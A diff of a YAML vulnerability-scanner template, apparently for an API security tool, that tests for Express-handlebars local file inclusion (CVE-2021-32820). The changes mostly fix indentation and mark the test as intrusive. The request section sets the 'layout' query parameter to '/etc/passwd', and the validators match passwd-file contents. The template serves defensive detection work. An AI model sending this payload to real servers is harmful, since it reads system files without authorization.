@@ -2,7 +2,7 @@ id: EXPRESS_HANDLEBARS_LFI
 info:
   name: "Express-handlebars Local File Inclusion"
   description: "This vulnerability affects applications using the Express-handlebars templating engine. It allows attackers to include local files by manipulating user input, potentially exposing sensitive data or configuration files. This exploitation occurs when file paths are not properly sanitized, leading to unauthorized access to the server's file system. As a result, attackers can gain insights into application structure and sensitive information stored in local files."
-  details:  "This vulnerability arises when user-controlled input is used to specify template file paths without adequate validation or sanitization. Attackers can craft requests that manipulate these paths, leading to the inclusion of arbitrary files from the server's file system. This vulnerability can expose sensitive data, such as configuration files or environment variables, potentially compromising application security and user data. Proper input validation and restrictions on file access are essential to mitigate this risk."
+  details: "This vulnerability arises when user-controlled input is used to specify template file paths without adequate validation or sanitization. Attackers can craft requests that manipulate these paths, leading to the inclusion of arbitrary files from the server's file system. This vulnerability can expose sensitive data, such as configuration files or environment variables, potentially compromising application security and user data. Proper input validation and restrictions on file access are essential to mitigate this risk."
   impact: "The impact of this vulnerability can be severe, allowing attackers to access sensitive files on the server, including configuration files, logs, or other application data. This unauthorized access may lead to data exposure, information leakage, and potential exploitation of additional vulnerabilities. In some cases, attackers could gain access to system-level information, potentially escalating their attack or compromising the entire application. Overall, this vulnerability undermines the confidentiality and integrity of the application and its data."
   category:
     name: LFI
@@ -19,6 +19,8 @@ info:
   cve:
     - CVE-2021-32820
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -41,23 +43,23 @@ execute:
   type: single
   requests:
     - req:
-      - modify_url: "/"
-      - modify_method: GET
-      - replace_body: '{}'
-      - add_query_param:
-          layout: "/etc/passwd"
+        - modify_url: "/"
+        - modify_method: GET
+        - replace_body: '{}'
+        - add_query_param:
+            layout: "/etc/passwd"
 validate:
   response_code:
     eq: 200
   and:
-  - response_payload:
-      not_contains:
-        - <html>
-        - </html>
-  - or: 
     - response_payload:
-        regex: "root:.*:0:0:"
-    - response_payload:
-        regex: "daemon:[x*]:0:0:"
-    - response_payload:
-        regex: "operator:[x*]:0:0:"
+        not_contains:
+          - <html>
+          - </html>
+    - or:
+        - response_payload:
+            regex: "root:.*:0:0:"
+        - response_payload:
+            regex: "daemon:[x*]:0:0:"
+        - response_payload:
+            regex: "operator:[x*]:0:0:"
